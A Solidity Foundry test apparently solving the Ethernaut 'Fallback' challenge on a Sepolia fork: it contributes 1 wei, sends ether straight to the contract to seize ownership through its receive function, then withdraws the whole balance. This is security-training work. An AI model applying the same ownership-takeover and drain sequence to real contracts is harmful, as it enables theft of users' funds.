// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.21;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";
import "forge-std/console.sol";

contract FallbackTest is Test {
    Fallback public fallbackContract = Fallback(payable(0x4318c9aEEb22Be7B0D1aA230c2671915eB827a6C));

    function setUp() external {
	vm.createSelectFork(vm.rpcUrl("sepolia"));
    }

    function testSolveChallenge() external {
	fallbackContract.contribute{value: 1 wei}();
	
        (bool success, ) = address(fallbackContract).call{value: 1 wei}("");
	require(success);
	
	fallbackContract.withdraw();

	assertEq(address(fallbackContract).balance, 0);
    }

    receive() external payable { }
}
